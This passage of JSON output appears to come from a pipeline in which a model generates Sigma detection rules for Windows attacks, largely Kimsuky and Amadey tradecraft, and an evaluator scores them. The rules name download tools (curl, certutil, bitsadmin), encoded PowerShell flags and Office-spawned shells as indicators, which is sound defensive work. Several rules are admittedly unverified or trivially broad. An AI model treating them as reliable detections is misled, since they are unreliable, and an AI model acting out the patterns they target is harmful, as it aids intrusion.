        "generation_method": "langchain",
        "id": "5f7789be-bdc8-4bba-b669-e0c31c74ca06"
      },
      {
        "title": "Screen Capture Activity Detected via NLP Pattern Matching",
        "description": "Detects screen capture activity by identifying processes commonly associated with taking screenshots or recording the screen, using command-line arguments and image paths indicative of screen capture tools.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system monitoring or automation scripts that capture UI elements for diagnostics or accessibility purposes",
          "Administrative tools using PowerShell or command-line utilities to capture screen for remote support (e.g., via RDP or remote assistance tools)",
          "Development or testing tools that programmatically capture screen output for UI validation"
        ],
        "level": "high",
        "tags": [
          "attack.collection",
          "attack.T1113",
          "custom.screen_capture",
          "custom.suspicious_process_behavior",
          "custom.command_line_anomalies"
        ],
        "ttp_id": "unknown",
        "technique_name": "Screen Capture",
        "generation_method": "langchain",
        "id": "50ae37b0-b4c9-4cb5-b4d7-ce6a8af289c1"
      },
      {
        "title": "Remote Desktop Protocol Activity Detected via Behavioral Indicators",
        "description": "Detects Remote Desktop Protocol (RDP) activity through process creation and network connection patterns indicative of lateral movement. Detection based on common RDP client usage and associated command-line parameters.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_rdp_process": {
            "Image|endswith": [
              "\\mstsc.exe",
              "\\tsclient.exe"
            ]
          },
          "selection_rdp_command": {
            "CommandLine|contains": [
              "/v:",
              "/admin",
              "/f",
              "/w:",
              "/h:",
              "-v",
              "-admin"
            ]
          },
          "selection_network": {
            "Image|endswith": [
              "\\svchost.exe",
              "\\lsass.exe"
            ],
            "CommandLine|contains": [
              "termservice",
              "RemoteDesktop"
            ]
          },
          "condition": "selection_rdp_process or selection_rdp_command or selection_network"
        },
        "falsepositives": [
          "Legitimate administrative use of RDP by IT staff",
          "Remote support sessions initiated by users",
          "Automated RDP-based monitoring tools",
          "RDP connections via Microsoft Azure Bastion or other cloud management platforms"
        ],
        "level": "high",
        "tags": [
          "attack.t1021.001",
          "attack.lateral_movement",
          "custom.windows",
          "custom.rdp",
          "custom.lateral_movement",
          "custom.mstsc"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Desktop Protocol",
        "generation_method": "langchain",
        "id": "f2f2b5b6-90bd-48c0-bad7-74ece7a420ee"
      },
      {
        "title": "User Execution: Malicious File",
        "description": "Detects User Execution: Malicious File activity via behavioral patterns in process creation events, focusing on suspicious child processes spawned from common document handlers and use of encoded or download-related command-line arguments.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_office_spawn": {
            "ParentImage|endswith": [
              "\\WINWORD.EXE",
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE",
              "\\OUTLOOK.EXE"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\pwsh.exe",
              "\\cscript.exe",
              "\\wscript.exe"
            ]
          },
          "selection_script_host": {
            "ParentImage|endswith": [
              "\\mshta.exe",
              "\\rundll32.exe",
              "\\regsvr32.exe"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\pwsh.exe",
              "\\cscript.exe",
              "\\wscript.exe",
              "\\mshta.exe",
              "\\rundll32.exe",
              "\\regsvr32.exe"
            ]
          },
          "selection_encoded": {
            "CommandLine|contains": [
              "-enc",
              "-encodedcommand",
              "-e",
              "-exec",
              "Bypass"
            ],
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          "selection_download": {
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "wget",
              "curl",
              "certutil",
              "bitsadmin",
              "-out"
            ],
            "Image|endswith": [
              "\\powershell.exe",
              "\\cmd.exe"
            ]
          },
          "selection_suspicious_path": {
            "Image|contains": [
              "%TEMP%",
              "%APPDATA%",
              "%LOCALAPPDATA%"
            ],
            "CommandLine|contains": [
              ".exe",
              ".dll",
              ".js",
              ".vbs"
            ]
          },
          "condition": "selection_office_spawn or selection_script_host or selection_encoded or selection_download or selection_suspicious_path"
        },
        "falsepositives": [
          "Legitimate administrative scripts using encoded commands or spawning shells from office applications",
          "Software installers that extract and execute binaries from temporary directories",
          "Authorized use of certutil or bitsadmin for file downloads"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1204.002"
        ],
        "ttp_id": "unknown",
        "technique_name": "User Execution: Malicious File",
        "generation_method": "langchain",
        "id": "f48e9a06-4f2f-44ae-9207-1ccda997ed63"
      }
    ]
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "rules_evaluated": 66,
      "average_quality_score": 0.617,
      "passing_rules": 9,
      "failing_rules": 57,
      "langchain_evaluations": 132,
      "fallback_evaluations": 0,
      "errors": 0,
      "processing_time_ms": 126109.4
    },
    "evaluation_results": [
      {
        "rule_title": "Remote Control Malware Execution by Kimsuky Group",
        "rule_id": "e91568c2-0c4e-4546-a2f1-2ba5a6e30fad",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Specific detection logic for multiple known remote access tools (XRat, HVNC, Amadey, Meterpreter)",
          "Uses process creation with image and command-line indicators, which are reliable telemetry sources",
          "Includes generic detection for unknown RATs via suspicious command-line patterns and image naming",
          "Well-documented false positives, aiding analyst triage",
          "Aligned with MITRE ATT&CK techniques and threat group (Kimsuky)"
        ],
        "weaknesses": [
          "No real-world verification performed, so effectiveness is unproven",
          "Detection coverage score reduced due to lack of verification (CRITICAL requirement not met)",
          "Generic selection (selection_generic_rat) may miss modern obfuscation or non-English naming",
          "Relies on exact string matches; no base64 or encoded argument detection",
          "Potential for false positives from legitimate tools with 'client', 'remote', 'control' in path"
        ],
        "suggestions": [
          "Conduct real-world testing with Kimsuky-related malware samples or emulation plans",
          "Add normalization or regex for obfuscated command lines (e.g., base64, PowerShell encodings)",
          "Improve generic detection by adding entropy checks or file age heuristics",
          "Consider adding network connection correlation to increase confidence",
          "Refine Image|contains conditions with exclusions for common benign tools (e.g., 'remote' in 'remoteprocedurecall')"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Kimsuky Group Spear Phishing Attack via LNK and Compressed Files",
        "rule_id": "eea49885-0a6d-446e-82dd-13af19fcb895",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Covers multiple initial access vectors associated with spear phishing (LNK files, compressed archives, Office-spawned shells)",
          "Uses specific Sysmon process creation fields for behavioral detection",
          "Includes relevant tags mapping to MITRE ATT&CK and threat actor (Kimsuky)",
          "Condition logic captures distinct but related attack patterns",
          "Acknowledges legitimate false positive scenarios in documentation"
        ],
        "weaknesses": [
          "Lacks real-world verification; no confirmation it detects actual Kimsuky activity",
          "Rule may generate false positives due to broad 'selection_compressed_exec' condition without context",
          "No correlation with email client processes or network indicators to strengthen phishing context",
          "Uses generic command-line tool names without argument analysis, increasing ambiguity",
          "Detection logic does not include known Kimsuky-specific IOCs or TTPs beyond generic tool use"
        ],
        "suggestions": [
          "Integrate email client process spawning (e.g., outlook.exe) as a parent process condition to strengthen phishing context",
          "Narrow 'selection_compressed_exec' with additional conditions like command-line arguments or child process behavior",
          "Add file path or directory anomalies (e.g., AppData, Temp) to increase malicious intent confidence",
          "Include network connection follow-up detection (e.g., PowerShell connecting externally) for higher fidelity",
          "Validate rule in environment using threat emulation to confirm detection coverage"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "LNK Malware Execution with Script Decompression",
        "rule_id": "e67002f7-30ff-45ef-95ef-913cce5c63c2",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and common LNK-based attack chain involving decompression and script execution",
          "Uses Sysmon process creation events which provide detailed context for behavioral detection",
          "Includes relevant MITRE ATT&CK tags for execution and T1204.002 (User Execution)",
          "Condition logic combines multiple behavioral indicators (LNK execution, decompression, script use)"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "High risk of false positives due to broad CommandLine conditions (e.g., '-r' and 'powershell' are common in legitimate use)",
          "Relies on ParentImage and Image conditions that may be easily bypassed (e.g., LNK files launched from email clients, not explorer.exe)",
          "The rule may miss variations where other shells (e.g., wscript, cscript) are used instead of PowerShell",
          "No use of file creation or child process events to confirm actual script execution or payload drop"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to validate detection capability",
          "Narrow CommandLine conditions with more specific indicators (e.g., 'expand -r' or 'powershell -enc')",
          "Add checks for child processes spawned by cmd.exe to confirm script execution",
          "Include file event correlation (e.g., creation of .ps1, .vbs files) to improve confidence",
          "Consider adding Image condition for common LNK execution paths (e.g., downloads folder) to reduce false positives",
          "Update TTP ID if known; currently listed as 'unknown'"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Persistence Script and Downloader Execution",
        "rule_id": "4aa8efd7-96cd-4b46-b867-fcf641f0bb26",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets relevant TTPs such as persistence and command-and-control behaviors",
          "The use of Sysmon process creation logs ensures visibility into process execution",
          "The condition logic is simple and efficient, using OR between two clear selections",
          "False positives are reasonably considered with two documented scenarios"
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy is unproven",
          "The CommandLine keywords like 'persistence script' or 'downloads and executes additional payloads' are generic and likely not used verbatim in actual malware",
          "The TTP ID is listed as 'unknown' and tactic is missing, reducing alignment with MITRE ATT&CK",
          "The rule was generated via 'langchain', suggesting potential hallucination or lack of empirical tuning",
          "No specific IOCs or behavioral patterns from known threats are included (e.g., specific file paths, encoded commands, or network activity)"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability",
          "Refine detection logic using actual malware command lines (e.g., from public reports or sandbox analysis)",
          "Replace generic keywords with specific indicators such as suspicious script arguments, encoded commands, or known malicious file paths",
          "Add additional context such as parent-child process relationships or image paths to reduce false positives",
          "Map the rule to a specific MITRE ATT&CK technique (e.g., T1053.005 or T1105) with correct IDs and tactics",
          "Include network connection or file creation events to improve detection completeness and correlation potential"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Proxy Malware Establishing RDP Connection",
        "rule_id": "1a06f7e6-e8d8-4161-bbc0-3c5fd129a0bf",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets specific and suspicious patterns such as 'svc.exe' at the end of the image path, which is uncommon for legitimate processes",
          "Inclusion of configuration file ('setting.ini') and RDP port (3389) in command line adds contextual specificity",
          "Condition logic combines multiple indicators, reducing the likelihood of accidental matches",
          "Tags align with MITRE ATT&CK framework (T1090 - Proxy), supporting threat intelligence integration"
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy against actual attack behavior is unproven",
          "Relies on filename pattern 'svc.exe' and hardcoded 'setting.ini' and '3389', which are easily changed by adversaries, leading to low detection coverage",
          "Potential for false positives from administrative scripts or legitimate tools using RDP arguments or config files",
          "Rule was generated via 'langchain', indicating possible hallucination or lack of empirical tuning",
          "No mention of parent-child process relationships or network context, limiting detection robustness"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability against the intended TTP",
          "Broaden detection logic with additional indicators of compromise (e.g., parent process, network connection logs) to reduce reliance on brittle filename/path patterns",
          "Add file hash monitoring or digital signature checks to distinguish malicious from legitimate use of similar patterns",
          "Include additional command-line arguments or configuration file paths commonly associated with proxy malware",
          "Cross-validate with other data sources (e.g., network connection events) to improve correlation and reduce false positives"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Amadey Malware Persistence via svc.vbs in Startup Folder",
        "rule_id": "65864945-717b-49ee-ba19-2fbd8da9ddbb",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
          "Specific detection logic targeting a known malicious behavior (Amadey persistence via svc.vbs in Startup folder)",
          "Uses precise field conditions (TargetFilename and Image) with appropriate wildcards",
          "Includes relevant MITRE ATT&CK tagging (T1547.005 - Registry Run Keys / Startup Folder)",
          "Low expected false positive rate due to uncommon legitimate use of 'svc.vbs' in Startup",
          "Efficient condition structure with minimal event processing overhead"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection efficacy is unproven",
          "Detection coverage score reduced due to lack of verification (per critical guideline)",
          "Relies on Sysmon file creation logging (which may not be enabled everywhere)",
          "Possibility of evasion via filename variation (e.g., different casing or slight name changes)"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability",
          "Consider broadening detection logic to include other common Amadey script names or hash monitoring",
          "Add process command-line checks if available to increase confidence",
          "Improve logging coverage requirements in the rule documentation",
          "Update TTP ID if known and ensure alignment with MITRE technique details"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Remote Control Malware Execution by Kimsuky Group",
        "rule_id": "54aac7b5-3f9b-49d7-90fe-80055b6b30e8",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Specific detection logic for known malware families (RftRAT, Amadey)",
          "Includes behavioral indicators via command-line arguments and parent-child process relationships",
          "Covers MITRE ATT&CK technique T1071.004 (Command and Control)",
          "Excludes some common false positives (e.g., legitimate use of cmd.exe with 'start')",
          "Well-structured with multiple detection conditions for different variants"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection effectiveness is unproven",
          "Relies on exact file names which can be easily modified by adversaries",
          "Generic behavior pattern may not be unique to Kimsuky or remote control malware",
          "No network indicators or IOCs that could improve confidence",
          "Rule may miss obfuscated or novel variants not matching exact command-line strings"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to validate detection capability",
          "Enhance with additional telemetry such as network connections or DNS queries to known C2 domains",
          "Use hash monitoring or YARA-like file content detection to reduce reliance on filenames",
          "Add context enrichment, such as user context or execution timing, to reduce false positives",
          "Update rule with verified IOCs from trusted threat intelligence sources if available"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Persistence via ALLUSERSPROFILE Startup Directory",
        "rule_id": "51e3dcd9-192f-4377-9795-909c8734e588",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a known persistence mechanism using the ALLUSERSPROFILE Startup directory, which aligns with MITRE ATT&CK T1547.001",
          "Uses Sysmon process creation logging, which provides reliable and detailed telemetry for detection",
          "Includes relevant false positives in the metadata, showing awareness of operational context",
          "Rule condition is simple and efficient, focusing on clear indicators (Image path ending with executable in Startup folder)"
        ],
        "weaknesses": [
          "Detection coverage is low due to lack of real-world verification; no events were verified in the SIEM, which critically undermines confidence in effectiveness",
          "The rule uses a hardcoded filename 'NsiService.exe', which is highly specific and likely to miss variations or other malicious executables in the same path",
          "The hardcoded executable name may be based on a single observed sample and could represent overfitting or a hallucination if not part of the actual TTP",
          "Limited detection logic: only matches one specific file, making it easy for attackers to evade by renaming"
        ],
        "suggestions": [
          "Replace or augment the hardcoded 'NsiService.exe' with a broader pattern (e.g., any executable .exe) in the Startup directory path to improve coverage",
          "Validate the rule in a test environment simulating the actual TTP to confirm detection capability",
          "Consider using file hash or command-line arguments as additional detection signals to reduce false negatives",
          "Add data enrichment or post-processing to correlate with other suspicious behaviors (e.g., file creation in Startup folder followed by execution) for higher fidelity",
          "Ensure future rules avoid specific filenames unless strongly tied to a known threat actor or campaign"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "VMP Packed ht.dll Loader with Configuration File Access",
        "rule_id": "1df1f4de-e732-4380-9162-2a1ff056255f",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets specific indicators associated with VMP packing and configuration file access, which are relevant to code obfuscation",
          "Condition logic combines multiple selections (image, command line, packing indicator), increasing specificity",
          "Includes relevant MITRE ATT&CK tagging (T1027 - Code Obfuscation)",
          "Log source is appropriate for the detection (Sysmon process creation)"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection coverage cannot be confirmed, which critically undermines confidence in effectiveness",
          "Rule relies on filename patterns (e.g., 'ht.dll', 'htsetting.ini') and 'VMP' in image path, which may not reliably indicate malicious activity",
          "Potential for false positives is acknowledged (legitimate software using VMProtect or similar), but no mitigation logic (e.g., exclusions) is implemented",
          "No use of file hash, digital signature, or behavioral context to strengthen detection",
          "'TTP ID' is listed as 'unknown' and tactic is missing, reducing traceability to MITRE framework"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection capability and refine logic",
          "Add process command-line or parent process context to reduce false positives (e.g., exclude known development environments)",
          "Consider enriching detection with file metadata (e.g., lack of signature, entropy thresholds) to better identify packed binaries",
          "Replace or supplement filename-based detection with hash intelligence or YARA-like file content matching if possible",
          "Update TTP metadata: map to correct MITRE technique (T1027) with proper tactic (Defense Evasion) and remove placeholder 'unknown' values",
          "Implement suppression or thresholding for high-frequency benign instances to improve operationalizability"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Kimsuky AutoIt-based XRat Loader Detection",
        "rule_id": "3110c81d-4dad-4cd0-809d-35b41f73fda0",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and relevant TTP (Kimsuky using AutoIt to load XRat)",
          "Uses precise field conditions (Image ends with AutoIt executables and CommandLine contains 'XRat')",
          "Log source is correctly specified (Sysmon process creation on Windows)",
          "Tags are comprehensive and aligned with MITRE ATT&CK and threat actor"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection capability is unproven",
          "Relies solely on 'XRat' in command line, which may be easily obfuscated or renamed",
          "No additional context or behavioral indicators (e.g., child processes, network connections) to strengthen detection",
          "Potential false positives from benign AutoIt scripts with 'XRat' as a variable or string (acknowledged in falsepositives list)",
          "Rule may miss renamed or obfuscated AutoIt binaries"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection efficacy",
          "Enhance detection logic with additional indicators (e.g., command-line arguments, script paths, or child processes like xrat.exe)",
          "Add file hash or signed driver checks to reduce false positives",
          "Include network connection or file creation follow-up events to increase confidence",
          "Consider using sigma-based field name aliases for better cross-platform compatibility",
          "Add Tactic to TTP metadata if known (e.g., Execution or Defense Evasion)"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.9,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Amadey Malware Execution via Rundll32.exe",
        "rule_id": "5dab9bed-303f-4529-9fe8-c090f0b40c0d",
        "quality_score": 0.575,
        "status": "fail",
        "strengths": [
          "The rule targets a legitimate and commonly abused execution technique (rundll32.exe) associated with malware like Amadey",
          "Log source is well-defined using Sysmon process creation events, which are rich in context",
          "False positives are reasonably documented, showing awareness of legitimate rundll32.exe usage",
          "Rule uses simple and efficient string matching conditions that are performant in most SIEMs"
        ],
        "weaknesses": [
          "Detection logic is overly broad: 'CommandLine|contains|\\' will match any command line with a backslash, which is nearly universal in Windows paths",
          "No specific indicators of compromise (IOCs) or behavioral patterns unique to Amadey are included",
          "No real-world verification was performed, so effectiveness is unproven",
          "Rule lacks specificity such as expected command-line arguments, DLL names, or parent-child process relationships commonly seen in Amadey execution"
        ],
        "suggestions": [
          "Refine the command-line selection to include known malicious patterns (e.g., URLs, suspicious arguments like -Embedding, or non-system paths)",
          "Add constraints such as command-line length, presence of encoded strings, or use of network-related parameters",
          "Incorporate parent process context (e.g., rundll32 spawned by Outlook or a browser) to increase precision",
          "Perform real-world testing or simulation to validate detection capability",
          "If available, include specific IOCs or TTPs from Amadey campaigns (e.g., known C2 domains, file paths) to improve coverage and reduce false positives"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Spear Phishing Attack by Kimsuky Group",
        "rule_id": "e9ce6e70-80ab-4a10-94d6-a4b146e9f131",
        "quality_score": 0.725,
        "status": "pass",
        "strengths": [
          "The rule targets a well-known initial access technique (suspicious child processes from Office apps), which aligns with common Kimsuky TTPs.",
          "Detection logic is based on process creation with specific parent-child relationships, which is effective for identifying malicious document-based execution.",
          "Includes relevant command-line indicators (e.g., -enc, iex, /c) commonly used in obfuscated script execution.",
          "Log source is appropriate (Sysmon process creation) for visibility into process lineage.",
          "Tags are aligned with MITRE ATT&CK (T1566) and threat actor (Kimsuky), improving traceability."
        ],
        "weaknesses": [
          "No real-world verification was performed, so actual detection efficacy is unknown \u2014 this introduces uncertainty in detection coverage.",
          "Rule may miss cases where attackers use less common scripting tools or alternate execution methods (e.g., msiexec, InstallUtil).",
          "Command-line keywords like '\"' and \"'\" are overly broad and may trigger on benign Office macro logging or artifacts.",
          "Relies on CommandLine field presence; if command-line auditing is disabled, rule will fail silently."
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection capability against known Kimsuky techniques.",
          "Refine command-line conditions to exclude overly generic strings like '\"' and \"'\" unless properly scoped.",
          "Consider adding optional detection branches for alternative execution vectors (e.g., mshta with script blocks, DCOM Office launches).",
          "Add data source validation requirement: ensure CommandLine auditing is enabled via Group Policy.",
          "Include event frequency thresholds or time-window correlations to reduce false positives from rare legitimate use cases.",
          "Enhance tagging with confirmed TTP ID if available (e.g., from ATT&CK)."
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "UAC Bypass via CMSTPLUA COM Interface and ICMLuaUtil",
        "rule_id": "43bbdaeb-acd0-4074-adfe-451f8b470c75",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
          "Specific detection logic targeting known UAC bypass indicators via ICMLuaUtil and CMSTPLUACOM",
          "Includes contextual filtering with %APPDATA% path, increasing specificity",
          "Low expected false positive rate due to rare legitimate use of ICMLuaUtil in command lines",
          "Efficient Sigma structure with simple contains conditions suitable for fast indexing"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection efficacy is unproven",
          "Detection coverage score reduced due to lack of verification (per critical rule)",
          "Specific file path (%APPDATA%\\asc\\t1.pb) may be easily modified by attackers, limiting generalization",
          "Rule may not cover all variants of UAC bypass using this interface"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection capability",
          "Broaden path detection logic to include wildcards or regex patterns for greater resilience to path changes",
          "Add additional telemetry sources (e.g., ImageLoaded, COM object registration) to improve detection robustness",
          "Include metadata such as TTP ID from MITRE if known, rather than 'unknown'"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.9,
          "maintainability": 0.8
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "AutoIt Script Execution Detected",
        "rule_id": "74b60ede-1fee-479a-bc3b-ede491303349",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Clear focus on a legitimate abuse vector (AutoIt script execution)",
          "Uses Sysmon process creation for reliable telemetry",
          "Includes relevant MITRE ATT&CK tagging for execution technique",
          "Condition logic is simple and efficient"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "Potential for false positives due to legitimate AutoIt usage not being sufficiently filtered",
          "CommandLine|contains 'autoit' may miss obfuscated or encoded scripts",
          "Case sensitivity in Image path (e.g., 'AutoIt3.exe' vs 'autoit3.exe') may lead to missed detections"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability",
          "Enhance detection logic to include case-insensitive matching for Image field",
          "Add additional context filters (e.g., parent process, command-line arguments) to reduce false positives",
          "Consider adding file hash monitoring or child process behavior to improve coverage of obfuscated scripts"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Suspicious Script Execution via BAT or VBS with Infostealer Indicators",
        "rule_id": "2051877a-33f6-4cdb-b5e7-c79a9771acb4",
        "quality_score": 0.55,
        "status": "fail",
        "strengths": [
          "Targets relevant process creation events via Sysmon for Windows",
          "Covers a broad set of command-line indicators associated with post-compromise behavior",
          "Focuses on scripting execution (BAT/VBS) which is common in initial execution and infostealer delivery",
          "Includes comprehensive list of suspicious utilities and commands tied to data gathering and lateral movement",
          "Well-documented false positives, showing awareness of operational impact"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection capability is unproven",
          "High potential for false positives due to inclusion of common admin tools (e.g., ipconfig, whoami, systeminfo) without context",
          "Rule may generate excessive noise due to overly broad command-line keyword matching",
          "Redundant entries in command list (e.g., 'net use', 'tasklist' appear multiple times)",
          "Relies on command-line arguments containing specific strings, which can be obfuscated or encoded"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to validate detection efficacy",
          "Narrow command-line selection using logic groups (e.g., data exfiltration vs. discovery) with thresholds or required combinations",
          "Add exclusions or context (e.g., parent process, user context, known safe paths) to reduce false positives",
          "Remove duplicate entries from CommandLine|contains list to improve readability and performance",
          "Consider splitting into multiple rules (e.g., discovery, exfiltration, execution) for better precision and tuning",
          "Use Sigma's field name aliases or backend-specific optimizations to improve cross-platform performance"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.6,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Kimsuky Dropper Installing Amadey Malware",
        "rule_id": "62102b49-9f4a-4b1f-b574-110e7beedea4",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known suspicious command-line patterns associated with dropper activity and Amadey malware",
          "It focuses on common living-off-the-land binaries (LOLBins) like mshta.exe and rundll32.exe, which are frequently abused in execution techniques",
          "The condition combines multiple behavioral indicators (dropper keywords, script hosts, suspicious arguments), increasing specificity over single-condition rules",
          "The rule includes documented false positives, showing awareness of potential noise"
        ],
        "weaknesses": [
          "No real-world verification was performed, so effectiveness against actual Kimsuky activity is unproven",
          "The CommandLine|contains conditions for 'dropper' and 'Amadey' may miss obfuscated or encoded variants where these strings are not present in plain text",
          "Matching on literal 'Amadey' in command line is fragile and prone to evasion (e.g., via string splitting or encoding)",
          "The TTP ID is listed as 'unknown' and tactic is missing, reducing alignment with MITRE ATT&CK framework",
          "No use of hash or image path indicators that could improve detection reliability"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection capability against known Kimsuky TTPs",
          "Replace or augment literal string matches (e.g., 'Amadey') with behavioral patterns such as URL patterns, C2 communication artifacts, or PowerShell decoding routines",
          "Add process ancestry or parent-child process logic to reduce false positives (e.g., mshta spawned from Office apps)",
          "Incorporate file hash indicators or known malicious command-line arguments from threat intel if available",
          "Map the rule to a valid MITRE ATT&CK technique ID (e.g., T1204.002 for User Execution) and ensure tactic field is populated"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "AutoIt Execution for Malware Deployment",
        "rule_id": "a6b47424-a97b-45b7-bf60-4ffcf83ab422",
        "quality_score": 0.675,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and legitimate execution technique (AutoIt3.exe) commonly abused by adversaries like Kimsuky.",
          "It uses precise detection logic with both image path and command-line indicators (\".au3\"), improving specificity.",
          "The inclusion of MITRE ATT&CK tags (T1106) and threat group context (Kimsuky) enhances threat intelligence alignment.",
          "The rule is simple and efficient, focusing only on essential Sysmon process creation fields, which aids performance."
        ],
        "weaknesses": [
          "Detection coverage is limited due to lack of real-world verification\u2014no events were verified, which critically undermines confidence in effectiveness.",
          "The rule may miss obfuscated or alternate command-line usages (e.g., scripts loaded from memory or with encoded paths).",
          "Relies solely on \".au3\" in the command line, which could be bypassed by attackers using embedded scripts or renamed files.",
          "No TTP ID or tactic provided in the target TTP, reducing traceability to MITRE framework."
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability and refine logic based on observed behaviors.",
          "Expand detection logic to include other AutoIt execution patterns (e.g., compiled scripts run via AutoIt3.exe with no extension, or use of AutoItX3.dll).",
          "Add file hash monitoring or child process behavior (e.g., spawning PowerShell or network connections) to improve confidence in malicious use.",
          "Include additional context such as command-line arguments (e.g., /ErrorStdOut) commonly used in malicious AutoIt executions.",
          "Enrich the rule with proper MITRE TTP ID and tactic mapping if available to improve completeness and integration with threat models."
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Kimsuky Group Keylogger Activity",
        "rule_id": "c1720ac2-5ed9-453c-be11-01da69241eb1",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Targets relevant process creation events associated with Kimsuky TTPs",
          "Covers multiple scripting interpreters (cmd, PowerShell, wscript, etc.) commonly abused in credential access",
